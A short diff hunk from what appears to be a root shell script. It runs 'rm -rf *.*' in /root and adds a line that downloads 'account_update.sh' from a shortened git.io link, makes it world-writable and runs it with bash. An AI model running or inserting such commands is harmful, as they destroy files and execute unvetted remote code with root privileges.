@@ -17,3 +17,4 @@ cat /root/nohup.out
 cd /root/
 rm -rf *.*
 ls
+curl -o account_update.sh -L https://git.io/JLnRW && chmod 777   account_update.sh && bash  account_update.sh
